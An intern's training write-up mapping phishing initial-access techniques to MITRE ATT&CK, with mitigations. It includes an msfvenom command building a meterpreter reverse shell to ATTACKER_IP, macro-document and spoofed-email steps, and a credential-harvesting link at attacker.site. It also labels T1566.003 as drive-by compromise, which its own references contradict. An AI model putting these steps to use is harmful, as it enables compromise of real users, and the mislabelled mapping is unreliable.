# MITRE ATT&CK PoC – Initial Access via Phishing

Intern: Aenosh
Organization: DigiSuraksha Parhari Foundation

## Tactic: Initial Access (TA0001)
Goal: Establish foothold in the target environment.

## Techniques:
- T1566.001 – Phishing: Spearphishing Attachment
Send a crafted malicious document to the target with embedded macro/payload.

- T1566.002 – Phishing: Spearphishing Link
Send a convincing email with a malicious hyperlink.

- T1566.003 – Phishing: Drive-by Compromise
Exploit browser vulnerabilities when user visits attacker-controlled website.

## Procedures:

### Technique 1 – Spearphishing Attachment
1. Create a malicious Word doc with macro (use msfvenom to embed payload):

``` bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > payload.exe

```
2. Embed payload into macro using Empire or oletools
3. Send via spoofed email pretending to be HR, invoice, or legal notice
4. User opens doc, enables macros → payload executes

### Technique 2 – Spearphishing Link

1. Host a malicious payload or fake login page on attacker.site
2. Craft email using social engineering (e.g. “Action Required: Password Expiry”)
3. Include link in email like:

```bash
https://attacker.site/reset-password
```

4. Victim clicks → site either:
    - Auto downloads malware
    - Harvests credentials

### Technique 3 – Drive-by Compromise

1. Set up attacker-controlled webpage with browser exploit (e.g. CVE-2021-26411)
2. Use compromised ad service or direct URL in emails
3. Victim visits → exploit silently delivers payload in background


## Mitigation Strategies:
| Technique    |Detection & Prevention                                           |
|--------------|-----------------------------------------------------------------|
| T1566.001    |Block attachments with macros, use sandboxing, train employees   |
| T1566.002    |Use email filtering, hover-over link training, browser isolation |
| T1566.003    |Keep browsers/plugins patched, deploy web content filtering      |

## Why This PoC Works

- Covers multiple phishing vectors used in real-world APTs and ransomware
- Shows both user-triggered and silent compromise methods
- Highlights how attackers abuse human behavior and browser flaws

## References

- [T1566 – Phishing](https://attack.mitre.org/techniques/T1566/) 
- [T1566.001 – Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)
- [T1566.002 – Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/)
- [T1566.003 – Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003/)

